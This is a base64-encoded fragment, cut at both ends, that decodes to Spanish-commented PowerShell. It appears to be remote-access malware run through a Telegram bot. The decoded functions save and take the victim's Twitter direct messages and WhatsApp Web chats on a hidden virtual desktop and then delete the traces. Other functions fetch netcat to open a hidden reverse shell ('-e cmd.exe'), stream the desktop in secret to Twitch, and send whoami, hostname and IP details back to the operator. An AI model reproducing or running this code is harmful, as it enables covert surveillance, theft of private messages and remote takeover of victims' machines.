m9tZS5leGUiDQogICAgICAgIGlmKCFbU3lzdGVtLklPLkZpbGVdOjpFeGlzdHMoJGNocm9tZSkpew0KICAgICAgICAgICAgJGNocm9tZSA9ICIke2VudjpQcm9ncmFtRmlsZXN9XEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSINCiAgICAgICAgICAgIFNlbmQtTWVzc2FnZSAiQ2hyb21lIHg2NCEiDQogICAgICAgICAgICByZXR1cm4gJGNocm9tZQ0KICAgICAgICB9DQogICAgICAgIFNlbmQtTWVzc2FnZSAiQ2hyb21leDg2ISINCiAgICAgICAgcmV0dXJuICRjaHJvbWUNCiAgICAgfQ0KDQogICAgRWxzZUlmICgkbWFpbkJyb3dzZXIgLW1hdGNoICdGaXJlZm94Jykgew0KICAgICAgICBTZW5kLU1lc3NhZ2UgIkZpcmVmb3ghIg0KICAgICAgICAkZmlyZWZveCA9ICIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTW96aWxsYSBGaXJlZm94XGZpcmVmb3guZXhlIg0KICAgICAgICBpZighW1N5c3RlbS5JTy5GaWxlXTo6RXhpc3RzKCRmaXJlZm94KSl7DQogICAgICAgICAgICAkZmlyZWZveCA9ICIke2VudjpQcm9ncmFtRmlsZXN9XE1vemlsbGEgRmlyZWZveFxmaXJlZm94LmV4ZSINCiAgICAgICAgICAgIFNlbmQtTWVzc2FnZSAiRmlyZWZveCB4NjQhIg0KICAgICAgICAgICAgcmV0dXJuICRmaXJlZm94DQogICAgICAgIH0NCiAgICAgICAgU2VuZC1NZXNzYWdlICJGaXJlZm94eDg2ISINCiAgICAgICAgcmV0dXJuICRmaXJlZm94DQogICAgIH0NCn0NCg0KZnVuY3Rpb24gSGFja1R3aXR0ZXJXMTAgew0KICAgIDwjDQogICAgQ3JlYXLDoSB1biBudWV2byBkZWtzdG9wIHZpcnR1YWwgZSBpbmljaWFyw6EgYWjDrSBlbCBmaXJlZm94IHkgZ3VhcmRhcsOhIGVsIGh0bWwsIGNvbW8gZXMgdW4gZGVza3RvcCB2aXJ0dWFsIGVsIHVzdWFyaW8gbm8gc2UgZW50ZXJhcsOhIGRlIGxvIHF1ZSBwYXNhDQogICAgRXN0YSBmdW5jaW9uIHNvbG8gZXMgdsOhbGlkYSBwYXJhIFcxMC4NCiAgICBNYW51YWxlczogDQogICAgICAgIGh0dHBzOi8vZG9jcy5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MvZGVza3RvcC9pbnB1dGRldi92aXJ0dWFsLWtleS1jb2RlcyANCiAgICAjPg0KDQoNCiAgICAjIEluaWNpYSB1biB2aXJ0dWFsIGRlc2t0b3AuDQogICAgJEtleVNob3J0Y3V0ID0gQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gQCINCltEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0NCnN0YXRpYyBleHRlcm4gdm9pZCBrZXliZF9ldmVudChieXRlIGJWaywgYnl0ZSBiU2NhbiwgdWludCBkd0ZsYWdzLCBVSW50UHRyIGR3RXh0cmFJbmZvKTsNCi8vV0lOICsgQ1RSTCArIEQ6IENyZWF0ZSBhIG5ldyBkZXNrdG9wDQpwdWJsaWMgc3RhdGljIHZvaWQgQ3JlYXRlVmlydHVhbERlc2t0b3BJbldpbjEwKCkNCnsNCiAgICAvL0tleSBkb3duDQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHg1QiwgMCwgMCwgVUludFB0ci5aZXJvKTsgLy9MZWZ0IFdpbmRvd3Mga2V5IA0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4MTEsIDAsIDAsIFVJbnRQdHIuWmVybyk7IC8vQ1RSTA0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4NDQsIDAsIDAsIFVJbnRQdHIuWmVybyk7IC8vRA0KICAgIC8vS2V5IHVwDQogICAgDQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHg1QiwgMCwgKHVpbnQpMHgyLCBVSW50UHRyLlplcm8pOw0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4MTEsIDAsICh1aW50KTB4MiwgVUludFB0ci5aZXJvKTsNCiAgICBrZXliZF9ldmVudCgoYnl0ZSkweDQ0LCAwLCAodWludCkweDIsIFVJbnRQdHIuWmVybyk7DQp9DQoiQCAtTmFtZSBDcmVhdGVWaXJ0dWFsRGVza3RvcDIgLVVzaW5nTmFtZXNwYWNlIFN5c3RlbS5UaHJlYWRpbmcgLVBhc3NUaHJ1DQogICANCiAgICAjIENhbWJpYSBhbCB2aXJ0dWFsIGRlc2t0b3AgZGUgbGEgaXF1aWVyZGEuDQogICAgJEtleVNob3J0Y3V0MiA9IEFkZC1UeXBlIC1NZW1iZXJEZWZpbml0aW9uIEAiDQpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildDQpzdGF0aWMgZXh0ZXJuIHZvaWQga2V5YmRfZXZlbnQoYnl0ZSBiVmssIGJ5dGUgYlNjYW4sIHVpbnQgZHdGbGFncywgVUludFB0ciBkd0V4dHJhSW5mbyk7DQovL1dJTiArIENUUkwgKyBMRUZUOiBTd2l0Y2ggZGVza3RvcA0KcHVibGljIHN0YXRpYyB2b2lkIFN3aXRjaExlZnRWaXJ0dWFsRGVza3RvcEluV2luMTAoKQ0Kew0KICAgIC8vS2V5IGRvd24NCiAgICBrZXliZF9ldmVudCgoYnl0ZSkweDVCLCAwLCAwLCBVSW50UHRyLlplcm8pOyAvL0xlZnQgV2luZG93cyBrZXkgDQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHgxMSwgMCwgMCwgVUludFB0ci5aZXJvKTsgLy9DVFJMDQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHgyNSwgMCwgMCwgVUludFB0ci5aZXJvKTsgLy9MRUZUDQogICAgLy9LZXkgdXANCiAgICANCiAgICBrZXliZF9ldmVudCgoYnl0ZSkweDVCLCAwLCAodWludCkweDIsIFVJbnRQdHIuWmVybyk7DQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHgxMSwgMCwgKHVpbnQpMHgyLCBVSW50UHRyLlplcm8pOw0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4MjUsIDAsICh1aW50KTB4MiwgVUludFB0ci5aZXJvKTsNCn0NCiJAIC1OYW1lIFN3aXRjaExlZnRWaXJ0dWFsRGVza3RvcCAtVXNpbmdOYW1lc3BhY2UgU3lzdGVtLlRocmVhZGluZyAtUGFzc1RocnUgICAgDQoNCiAgICAjIENhbWJpYSBhbCB2aXJ0dWFsIGRlc2t0b3AgZGUgbGEgZGVyZWNoYS4NCiAgICAkS2V5U2hvcnRjdXQzID0gQWRkLVR5cGUgLU1lbWJlckRlZmluaXRpb24gQCINCltEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0NCnN0YXRpYyBleHRlcm4gdm9pZCBrZXliZF9ldmVudChieXRlIGJWaywgYnl0ZSBiU2NhbiwgdWludCBkd0ZsYWdzLCBVSW50UHRyIGR3RXh0cmFJbmZvKTsNCi8vV0lOICsgQ1RSTCArIExFRlQ6IFN3aXRjaCBkZXNrdG9wDQpwdWJsaWMgc3RhdGljIHZvaWQgU3dpdGNoUmlnaHRWaXJ0dWFsRGVza3RvcEluV2luMTAoKQ0Kew0KICAgIC8vS2V5IGRvd24NCiAgICBrZXliZF9ldmVudCgoYnl0ZSkweDVCLCAwLCAwLCBVSW50UHRyLlplcm8pOyAvL0xlZnQgV2luZG93cyBrZXkgDQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHgxMSwgMCwgMCwgVUludFB0ci5aZXJvKTsgLy9DVFJMDQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHgyNywgMCwgMCwgVUludFB0ci5aZXJvKTsgLy9SSUdIVA0KICAgIC8vS2V5IHVwDQogICAgDQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHg1QiwgMCwgKHVpbnQpMHgyLCBVSW50UHRyLlplcm8pOw0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4MTEsIDAsICh1aW50KTB4MiwgVUludFB0ci5aZXJvKTsNCiAgICBrZXliZF9ldmVudCgoYnl0ZSkweDI3LCAwLCAodWludCkweDIsIFVJbnRQdHIuWmVybyk7DQp9DQoiQCAtTmFtZSBTd2l0Y2hSaWdodFZpcnR1YWxEZXNrdG9wIC1Vc2luZ05hbWVzcGFjZSBTeXN0ZW0uVGhyZWFkaW5nIC1QYXNzVGhydSAgICANCg0KICAgICRLZXlTaG9ydGN1dDo6Q3JlYXRlVmlydHVhbERlc2t0b3BJbldpbjEwKCkNCiAgICANCiAgICAjIEluaWNpYSBlbCBuYXZlZ2Fkb3IgcG9yIGRlZmVjdG8geSBhYnJlIHR3aXR0ZXIuDQogICAgJG1haW5Ccm93c2VyID0gbWFpbkJyb3dzZXIgDQogICAgU3RhcnQtUHJvY2VzcyAkbWFpbkJyb3dzZXIgLUFyZ3VtZW50TGlzdCAnLS1uZXctd2luZG93IGh0dHBzOi8vdHdpdHRlci5jb20vbWVzc2FnZXMnIA0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDINCiAgICAkd3NoZWxsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IHdzY3JpcHQuc2hlbGwNCiAgICAkS2V5U2hvcnRjdXQyOjpTd2l0Y2hMZWZ0VmlydHVhbERlc2t0b3BJbldpbjEwKCkNCg0KICAgICMgRXNwZXJhIDEwIHNlZ3VuZG9zIGEgY2FyZ2FyIGNvbXBsZXRhbWVudGUgbGEgcMOhZ2luYQ0KICAgIFN0YXJ0LXNsZWVwIC1TZWNvbmRzIDEwDQoNCiAgICAjIEFjdGl2YSBsYSB2ZW50YW5hIGNvbiBlbCBub21icmU6ICdJbmljaWFyIHNlc2nDs24gZW4gVHdpdHRlcicNCiAgICAkS2V5U2hvcnRjdXQzOjpTd2l0Y2hSaWdodFZpcnR1YWxEZXNrdG9wSW5XaW4xMCgpDQogICAgJHdzaGVsbC5BcHBBY3RpdmF0ZSgndHdpdHRlcicpIA0KICAgICR3c2hlbGwuU2VuZEtleXMoIl57c30iKSANCiAgICAkd3NoZWxsLkFwcEFjdGl2YXRlKCdHdWFyZGFyIGNvbW8nKQ0KICAgIFNsZWVwIC1TZWNvbmRzIDIgDQogICAgJHdzaGVsbC5TZW5kS2V5cygndCcpIA0KICAgIFNsZWVwIC1TZWNvbmRzIDINCiAgICAkd3NoZWxsLlNlbmRLZXlzKCd+JykgDQogICAgJEtleVNob3J0Y3V0Mjo6U3dpdGNoTGVmdFZpcnR1YWxEZXNrdG9wSW5XaW4xMCgpDQoNCiAgICBTbGVlcCAtU2Vjb25kcyA1DQogICAgR2V0LUNoaWxkSXRlbSAiQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb3dubG9hZHNcdF9maWxlcyIgfCBDb21wcmVzcy1BcmNoaXZlIC1EZXN0aW5hdGlvblBhdGggIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG93bmxvYWRzXHRfZmlsZXMuemlwIiAtQ29tcHJlc3Npb25MZXZlbCBPcHRpbWFsIA0KDQogICAgU2xlZXAgLVNlY29uZHMgNQ0KICAgIGRvd25sb2FkICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvd25sb2Fkc1x0Lmh0bWwiDQogICAgZG93bmxvYWQgIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG93bmxvYWRzXHRfZmlsZXMuemlwIg0KICAgICAgICANCiAgICBTbGVlcCAtU2Vjb25kcyA1DQogICAgUmVtb3ZlLUl0ZW0gIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG93bmxvYWRzXHQuaHRtbCINCiAgICBSZW1vdmUtSXRlbSAtUmVjdXJzZSAiQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb3dubG9hZHNcdF9maWxlcyINCiAgICBSZW1vdmUtSXRlbSAiQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb3dubG9hZHNcdF9maWxlcy56aXAiDQp9DQoNCmZ1bmN0aW9uIGhhY2tXaGF0c0FQUFcxMCB7DQogICA8Iw0KICAgIE5vIGRlc2NhcmdhIGxhcyBjb252ZXJzYWNpb25lcyBkZSBjYWRhIHVzdWFyaW8sIHBhcmEgZWxsbyBoYWJyaWEgcXVlIGVudHJhciBlbiBjYWRhIGNvbnZlcnNhY2lvbiBwYXJhIHF1ZSBlbCBKUyBjYXJnZSBkZSBsYSBCRCBkZSB3aGF0c2FwcCBsb3MgbWVuc2FqZXMuDQogICAgTWFudWFsZXM6IA0KICAgICAgICBodHRwczovL2RvY3MubWljcm9zb2Z0LmNvbS9lbi11cy93aW5kb3dzL2Rlc2t0b3AvaW5wdXRkZXYvdmlydHVhbC1rZXktY29kZXMgDQogICAgIz4NCg0KDQogICAgIyBJbmljaWEgdW4gdmlydHVhbCBkZXNrdG9wLg0KICAgICRLZXlTaG9ydGN1dCA9IEFkZC1UeXBlIC1NZW1iZXJEZWZpbml0aW9uIEAiDQpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildDQpzdGF0aWMgZXh0ZXJuIHZvaWQga2V5YmRfZXZlbnQoYnl0ZSBiVmssIGJ5dGUgYlNjYW4sIHVpbnQgZHdGbGFncywgVUludFB0ciBkd0V4dHJhSW5mbyk7DQovL1dJTiArIENUUkwgKyBEOiBDcmVhdGUgYSBuZXcgZGVza3RvcA0KcHVibGljIHN0YXRpYyB2b2lkIENyZWF0ZVZpcnR1YWxEZXNrdG9wSW5XaW4xMCgpDQp7DQogICAgLy9LZXkgZG93bg0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4NUIsIDAsIDAsIFVJbnRQdHIuWmVybyk7IC8vTGVmdCBXaW5kb3dzIGtleSANCiAgICBrZXliZF9ldmVudCgoYnl0ZSkweDExLCAwLCAwLCBVSW50UHRyLlplcm8pOyAvL0NUUkwNCiAgICBrZXliZF9ldmVudCgoYnl0ZSkweDQ0LCAwLCAwLCBVSW50UHRyLlplcm8pOyAvL0QNCiAgICAvL0tleSB1cA0KICAgIA0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4NUIsIDAsICh1aW50KTB4MiwgVUludFB0ci5aZXJvKTsNCiAgICBrZXliZF9ldmVudCgoYnl0ZSkweDExLCAwLCAodWludCkweDIsIFVJbnRQdHIuWmVybyk7DQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHg0NCwgMCwgKHVpbnQpMHgyLCBVSW50UHRyLlplcm8pOw0KfQ0KIkAgLU5hbWUgQ3JlYXRlVmlydHVhbERlc2t0b3AyIC1Vc2luZ05hbWVzcGFjZSBTeXN0ZW0uVGhyZWFkaW5nIC1QYXNzVGhydQ0KICAgDQogICAgIyBDYW1iaWEgYWwgdmlydHVhbCBkZXNrdG9wIGRlIGxhIGlxdWllcmRhLg0KICAgICRLZXlTaG9ydGN1dDIgPSBBZGQtVHlwZSAtTWVtYmVyRGVmaW5pdGlvbiBAIg0KW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXQ0Kc3RhdGljIGV4dGVybiB2b2lkIGtleWJkX2V2ZW50KGJ5dGUgYlZrLCBieXRlIGJTY2FuLCB1aW50IGR3RmxhZ3MsIFVJbnRQdHIgZHdFeHRyYUluZm8pOw0KLy9XSU4gKyBDVFJMICsgTEVGVDogU3dpdGNoIGRlc2t0b3ANCnB1YmxpYyBzdGF0aWMgdm9pZCBTd2l0Y2hMZWZ0VmlydHVhbERlc2t0b3BJbldpbjEwKCkNCnsNCiAgICAvL0tleSBkb3duDQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHg1QiwgMCwgMCwgVUludFB0ci5aZXJvKTsgLy9MZWZ0IFdpbmRvd3Mga2V5IA0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4MTEsIDAsIDAsIFVJbnRQdHIuWmVybyk7IC8vQ1RSTA0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4MjUsIDAsIDAsIFVJbnRQdHIuWmVybyk7IC8vTEVGVA0KICAgIC8vS2V5IHVwDQogICAgDQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHg1QiwgMCwgKHVpbnQpMHgyLCBVSW50UHRyLlplcm8pOw0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4MTEsIDAsICh1aW50KTB4MiwgVUludFB0ci5aZXJvKTsNCiAgICBrZXliZF9ldmVudCgoYnl0ZSkweDI1LCAwLCAodWludCkweDIsIFVJbnRQdHIuWmVybyk7DQp9DQoiQCAtTmFtZSBTd2l0Y2hMZWZ0VmlydHVhbERlc2t0b3AgLVVzaW5nTmFtZXNwYWNlIFN5c3RlbS5UaHJlYWRpbmcgLVBhc3NUaHJ1ICAgIA0KDQogICAgIyBDYW1iaWEgYWwgdmlydHVhbCBkZXNrdG9wIGRlIGxhIGRlcmVjaGEuDQogICAgJEtleVNob3J0Y3V0MyA9IEFkZC1UeXBlIC1NZW1iZXJEZWZpbml0aW9uIEAiDQpbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildDQpzdGF0aWMgZXh0ZXJuIHZvaWQga2V5YmRfZXZlbnQoYnl0ZSBiVmssIGJ5dGUgYlNjYW4sIHVpbnQgZHdGbGFncywgVUludFB0ciBkd0V4dHJhSW5mbyk7DQovL1dJTiArIENUUkwgKyBMRUZUOiBTd2l0Y2ggZGVza3RvcA0KcHVibGljIHN0YXRpYyB2b2lkIFN3aXRjaFJpZ2h0VmlydHVhbERlc2t0b3BJbldpbjEwKCkNCnsNCiAgICAvL0tleSBkb3duDQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHg1QiwgMCwgMCwgVUludFB0ci5aZXJvKTsgLy9MZWZ0IFdpbmRvd3Mga2V5IA0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4MTEsIDAsIDAsIFVJbnRQdHIuWmVybyk7IC8vQ1RSTA0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4MjcsIDAsIDAsIFVJbnRQdHIuWmVybyk7IC8vUklHSFQNCiAgICAvL0tleSB1cA0KICAgIA0KICAgIGtleWJkX2V2ZW50KChieXRlKTB4NUIsIDAsICh1aW50KTB4MiwgVUludFB0ci5aZXJvKTsNCiAgICBrZXliZF9ldmVudCgoYnl0ZSkweDExLCAwLCAodWludCkweDIsIFVJbnRQdHIuWmVybyk7DQogICAga2V5YmRfZXZlbnQoKGJ5dGUpMHgyNywgMCwgKHVpbnQpMHgyLCBVSW50UHRyLlplcm8pOw0KfQ0KIkAgLU5hbWUgU3dpdGNoUmlnaHRWaXJ0dWFsRGVza3RvcCAtVXNpbmdOYW1lc3BhY2UgU3lzdGVtLlRocmVhZGluZyAtUGFzc1RocnUgICAgDQoNCiAgICAkS2V5U2hvcnRjdXQ6OkNyZWF0ZVZpcnR1YWxEZXNrdG9wSW5XaW4xMCgpDQogICAgDQogICAgIyBJbmljaWEgZWwgbmF2ZWdhZG9yIHBvciBkZWZlY3RvIHkgYWJyZSB0d2l0dGVyLg0KICAgICRtYWluQnJvd3NlciA9IG1haW5Ccm93c2VyIA0KICAgIFN0YXJ0LVByb2Nlc3MgJG1haW5Ccm93c2VyIC1Bcmd1bWVudExpc3QgJy0tbmV3LXdpbmRvdyBodHRwczovL3dlYi53aGF0c2FwcC5jb20vJyANCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAyDQogICAgJHdzaGVsbCA9IE5ldy1PYmplY3QgLUNvbU9iamVjdCB3c2NyaXB0LnNoZWxsDQogICAgJEtleVNob3J0Y3V0Mjo6U3dpdGNoTGVmdFZpcnR1YWxEZXNrdG9wSW5XaW4xMCgpDQoNCiAgICAjIEVzcGVyYSAxMCBzZWd1bmRvcyBhIGNhcmdhciBjb21wbGV0YW1lbnRlIGxhIHDDoWdpbmENCiAgICBTdGFydC1zbGVlcCAtU2Vjb25kcyAxMA0KDQogICAgIyBBY3RpdmEgbGEgdmVudGFuYSBjb24gZWwgbm9tYnJlOiAnSW5pY2lhciBzZXNpw7NuIGVuIFR3aXR0ZXInDQogICAgJEtleVNob3J0Y3V0Mzo6U3dpdGNoUmlnaHRWaXJ0dWFsRGVza3RvcEluV2luMTAoKQ0KICAgICR3c2hlbGwuQXBwQWN0aXZhdGUoJ01vemlsbGEgRmlyZWZveCcpIA0KICAgICR3c2hlbGwuU2VuZEtleXMoIl57c30iKSANCiAgICAkd3NoZWxsLkFwcEFjdGl2YXRlKCdHdWFyZGFyIGNvbW8nKQ0KICAgIFNsZWVwIC1TZWNvbmRzIDIgDQogICAgJHdzaGVsbC5TZW5kS2V5cygndycpIA0KICAgIFNsZWVwIC1TZWNvbmRzIDEgDQogICAgJHdzaGVsbC5TZW5kS2V5cygnficpIA0KICAgICRLZXlTaG9ydGN1dDI6OlN3aXRjaExlZnRWaXJ0dWFsRGVza3RvcEluV2luMTAoKQ0KDQogICAgU2xlZXAgLVNlY29uZHMgNQ0KICAgIEdldC1DaGlsZEl0ZW0gIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG93bmxvYWRzXHdfZmlsZXMiIHwgQ29tcHJlc3MtQXJjaGl2ZSAtRGVzdGluYXRpb25QYXRoICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvd25sb2Fkc1x3X2ZpbGVzLnppcCIgLUNvbXByZXNzaW9uTGV2ZWwgT3B0aW1hbA0KDQogICAgU2xlZXAgLVNlY29uZHMgNQ0KICAgIGRvd25sb2FkICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvd25sb2Fkc1x3Lmh0bWwiDQogICAgZG93bmxvYWQgIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG93bmxvYWRzXHdfZmlsZXMuemlwIg0KDQogICAgU2xlZXAgLVNlY29uZHMgNQ0KICAgIFJlbW92ZS1JdGVtICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvd25sb2Fkc1x3Lmh0bWwiDQogICAgUmVtb3ZlLUl0ZW0gLVJlY3Vyc2UgIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG93bmxvYWRzXHdfZmlsZXMiDQogICAgUmVtb3ZlLUl0ZW0gIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG93bmxvYWRzXHdfZmlsZXMuemlwIg0KfQ0KDQpmdW5jdGlvbiBuZXRjYXQoJGlwKSB7DQogICAgU2VuZC1NZXNzYWdlICJEb3dubG9hZGluZ19uZXRjYXQuLiINCiAgICAkdXJsID0gImh0dHBzOi8vZXRlcm5hbGx5Ym9yZWQub3JnL21pc2MvbmV0Y2F0L25ldGNhdC13aW4zMi0xLjEyLnppcCINCiAgICAkb3V0cGF0aCA9ICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvY3VtZW50c1xuYy56aXAiDQogICAgJG91dHBhdGhVbnppcCAgPSAiQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb2N1bWVudHNcbmMiDQogICAgW05ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VjdXJpdHlQcm90b2NvbCA9IFtOZXQuU2VjdXJpdHlQcm90b2NvbFR5cGVdOjpUbHMxMg0KICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkb3V0cGF0aA0KICAgIA0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUNCiAgICBFeHBhbmQtQXJjaGl2ZSAkb3V0cGF0aCAtRGVzdGluYXRpb25QYXRoICRvdXRwYXRoVW56aXANCiAgICAkYXJncyA9ICIkaXAgODg4OCAtZSBjbWQuZXhlIg0KICAgICRuZXRjYXQgPSAkb3V0cGF0aFVuemlwKyJcbmMuZXhlIg0KDQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNQ0KICAgIFNlbmQtTWVzc2FnZSAiQ29ubmVjdGluZy4uIg0KICAgIFNlbmQtTWVzc2FnZSAiSVA6JGlwIg0KICAgIFNlbmQtTWVzc2FnZSAiUG9ydDo4ODg4Ig0KICAgIFN0YXJ0LVByb2Nlc3MgJG5ldGNhdCAtQXJndW1lbnRMaXN0ICRhcmdzIC1XaW5kb3dTdHlsZSBIaWRkZW4NCn0NCg0KZnVuY3Rpb24gc3RvcG5ldGNhdCB7DQogICAgU2VuZC1NZXNzYWdlICJTdG9wcGluZ19uZXRjYXQuLiINCiAgICB0YXNra2lsbCAvRiAvSU0gbmMuZXhlDQogICAgDQogICAgU2xlZXAgLVNlY29uZHMgNQ0KICAgIFNlbmQtTWVzc2FnZSAiRGVsZXRpbmdfbmV0Y2F0Li4iDQogICAgUmVtb3ZlLUl0ZW0gLVJlY3Vyc2UgIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG9jdW1lbnRzXG5jIg0KICAgIFJlbW92ZS1JdGVtICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvY3VtZW50c1xuYy56aXAiIA0KfQ0KDQpmdW5jdGlvbiB0d2l0Y2goJFNUUkVBTV9LRVkpIHsNCiAgICBTZW5kLU1lc3NhZ2UgIkRvd25sb2FkaW5nX0ZGbXBlZy4uIg0KICAgICR1cmwgPSAiaHR0cHM6Ly9mZm1wZWcuemVyYW5vZS5jb20vYnVpbGRzL3dpbjMyL3N0YXRpYy9mZm1wZWctMjAxODA4MjgtMjZkYzc2My13aW4zMi1zdGF0aWMuemlwIg0KICAgICRvdXRwYXRoID0gIkM6XFVzZXJzXCRlbnY6dXNlcm5hbWVcRG9jdW1lbnRzXEZGbXBlZy56aXAiDQogICAgJG91dHBhdGhVbnppcCAgPSAiQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb2N1bWVudHNcRkZtcGVnIg0KICAgIFtOZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgPSBbTmV0LlNlY3VyaXR5UHJvdG9jb2xUeXBlXTo6VGxzMTINCiAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgJG91dHBhdGgNCg0KICAgIFNlbmQtTWVzc2FnZSAiU3RhcnRpbmdfc3RyZWFtaW5nLi4iDQogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgNQ0KICAgIEV4cGFuZC1BcmNoaXZlICRvdXRwYXRoIC1EZXN0aW5hdGlvblBhdGggJG91dHBhdGhVbnppcA0KICAgICRGRm1wZWcgPSAkb3V0cGF0aFVuemlwKyJcZmZtcGVnLTIwMTgwODI4LTI2ZGM3NjMtd2luMzItc3RhdGljXGJpblxmZm1wZWcuZXhlIg0KICAgIFN0YXJ0LVByb2Nlc3MgLUZpbGVwYXRoICRGRm1wZWcgIi1mIGdkaWdyYWIgLXMgMTkyMHgxMDgwIC1mcmFtZXJhdGUgMTUgLWkgZGVza3RvcCAtYzp2IGxpYngyNjQgLXByZXNldCBmYXN0IC1waXhfZm10IHl1djQyMHAgLXMgMTI4MHg4MDAgLXRocmVhZHMgMCAtZiBmbHYgcnRtcDovL2xpdmUtbWFkLnR3aXRjaC50di9hcHAvJFNUUkVBTV9LRVkiIC13aW5kb3dzdHlsZSBoaWRkZW4NCn0NCg0KZnVuY3Rpb24gc3RvcHR3aXRjaCB7DQogICAgU2VuZC1NZXNzYWdlICJTdG9wcGluZyB0d2l0Y2guLiINCiAgICB0YXNra2lsbCAvRiAvSU0gZmZtcGVnLmV4ZQ0KICAgIA0KICAgIFNsZWVwIC1TZWNvbmRzIDUNCiAgICBSZW1vdmUtSXRlbSAtUmVjdXJzZSAiQzpcVXNlcnNcJGVudjp1c2VybmFtZVxEb2N1bWVudHNcRkZtcGVnIg0KICAgIFJlbW92ZS1JdGVtICJDOlxVc2Vyc1wkZW52OnVzZXJuYW1lXERvY3VtZW50c1xGRm1wZWcuemlwIg0KfQ0KDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyMgQllQQVNTIFBPTElDSUVTICMjDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMNCg0KIyBTZXQtRXhlY3V0aW9uUG9saWN5IC1TY29wZSBDdXJyZW50VXNlciAtRXhlY3V0aW9uUG9saWN5IFVucmVzdHJpY3RlZA0KDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIyBDT05ORUNUIFdJVEggQ0hBTk5FTCAjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCg0KJHdob2FtaSA9IEludm9rZS1FeHByZXNzaW9uIHdob2FtaQ0KJGlwVjQgPSBUZXN0LUNvbm5lY3Rpb24gLUNvbXB1dGVyTmFtZSAoaG9zdG5hbWUpIC1Db3VudCAxICB8IFNlbGVjdCAtRXhwYW5kUHJvcGVydHkgSVBWNEFkZHJlc3MNCiRpcFY0ID0gJGlwVjQuSVBBZGRyZXNzVG9TdHJpbmcNCiRob3N0bmFtZSA9IEludm9rZS1FeHByZXNzaW9uIGhvc3RuYW1lDQokcHdkID0gcHdkDQoNCiRpbmZvID0gJ1shXSAnICsgJGhvc3RuYW1lICsgJyAtICcgKyAkd2hvYW1pICsgJyAtICcgKyAkaXB2NCArICcgJyArICRwd2QgKyAnPiAnDQppZigkbm9wcmV2aWV3KSB7ICRwcmV2aWV3X21vZGUgPSAiVHJ1ZSIgfQ0KaWYoJG1hcmtkb3duKSB7ICRtYXJrZG93bl9tb2RlID0gIk1hcmtkb3duIiB9IGVsc2UgeyRtYXJrZG93bl9tb2RlID0gIiJ9DQoNCiRwYXlsb2FkID0gQHsNCiAgICAiY2hhdF9pZCIgPSAkQ2hhdElEOw0KICAgICJ0ZXh0IiA9ICRpbmZvOw0KICAgICJwYXJzZV9tb2RlIiA9ICRtYXJrZG93bl9tb2RlOw0KICAgICJkaXNhYmxlX3dlYl9wYWdlX3ByZXZpZXciID0gJHByZXZpZXdfbW9kZTsNCn0NCkludm9r